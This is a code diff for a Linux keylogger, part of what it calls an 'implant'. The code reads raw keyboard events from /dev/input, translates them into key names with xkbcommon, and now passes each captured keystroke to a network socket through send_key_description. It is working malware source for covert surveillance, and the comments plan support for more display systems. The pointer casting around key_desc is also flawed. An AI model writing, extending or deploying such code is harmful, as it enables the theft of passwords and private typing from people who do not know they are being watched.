@@ -30,9 +30,19 @@ static int get_highest_fd(implant_t *instance) {
     return highest_fd;
 }
 
-static int log_keyboard(int fd, struct xkb_state *state) {
+static int log_keyboard(int fd, struct xkb_state *state, char *key_desc_ptr[STRING_BUFFER_SIZE]) {
     struct input_event evt = {0};
     static bool shift_pressed = false;
+
+
+
+    /*
+        read events out of /dev/input/by-path/${**}-kbd
+
+    TODO:
+        for now, we only read one, but we can attempt to read them in
+        bulk of 6-10 once bufferizing messages is implemented
+    */
 
     ssize_t bytes_read = read(fd, &evt, sizeof(evt));
     if (bytes_read != sizeof(evt)) {
@@ -44,6 +54,7 @@ static int log_keyboard(int fd, struct xkb_state *state) {
         return ERROR;
     }
 
+    /* checking is we are in MAJ key. TODO: check if CAPS_LOCK is enabled or not. */
     if (evt.type == EV_KEY && evt.value == KEY_RELEASED) {
         if (evt.code == KEY_LEFTSHIFT || evt.code == KEY_RIGHTSHIFT) {
             shift_pressed = false;
@@ -58,17 +69,25 @@ static int log_keyboard(int fd, struct xkb_state *state) {
             return SUCCESSFUL;
         }
 
-        char key_description[256] = {0};
+        /*
+            TODO:
+
+            1) add support for xlib as well, so that wayland AND xlib are
+            supported. this should allow us to then relay those without issues
+
+            2) add check for which library is installed & add abstraction layer
+        */
+
         xkb_keysym_t keysym = xkb_state_key_get_one_sym(state, evt.code + 8);
 
         if (shift_pressed)
             keysym = xkb_keysym_to_upper(keysym);
 
-        xkb_keysym_get_name(keysym, key_description, 256);
+        xkb_keysym_get_name(keysym, *key_desc_ptr, STRING_BUFFER_SIZE);
 
 #ifdef DEBUG
         /* tracing this in stdout so that errors can be cleanly sent to a file */
-        printf("[+] Key pressed: %s\n", key_description);
+        printf("[+] Key pressed: %s\n", *key_desc_ptr);
 #endif
 
     }
@@ -80,7 +99,7 @@ static int log_keyboard(int fd, struct xkb_state *state) {
 /*
     main loop to listen for keys and stuff
 */
-void keylog(implant_t *instance) {
+void keylog(implant_t *instance, int sockfd) {
 
 
     /* first set up select etc */
@@ -101,7 +120,7 @@ void keylog(implant_t *instance) {
     /*
        initialize xkbcommon context
 
-       this is the stuff that allows us to maps keys to
+       this is the stuff that allows us to map keys to
        the correct language & manages special characters, shift, etc.
     */
 
@@ -142,7 +161,7 @@ void keylog(implant_t *instance) {
 
 
     /* run the damn loop */
-    while (1312) {
+    while (0x520) {
 
         /* setup FD-sets */
         keyboard_t *it = NULL;
@@ -197,11 +216,17 @@ void keylog(implant_t *instance) {
             /* checking for new input here */
             if (FD_ISSET(it->fd, &rd)) {
 
+                char key_desc[STRING_BUFFER_SIZE] = {0};
+
                 /*
                     should we really kill the run here or can we recover this ?
                     i need to run some tests before making a decision.
                 */
-                if (log_keyboard(it->fd, state) == ERROR)
+                if (ERROR == log_keyboard(it->fd, state, (char **)&key_desc))
+                    goto LOG_FUNCTION_CLEANUP;
+
+
+                if (ERROR == send_key_description(sockfd, key_desc))
                     goto LOG_FUNCTION_CLEANUP;
             }
 
@@ -211,6 +236,9 @@ void keylog(implant_t *instance) {
 
 
 LOG_FUNCTION_CLEANUP:
+
+    /* TODO: close the file descriptors */
+
     if (state != NULL)
         xkb_state_unref(state);
 
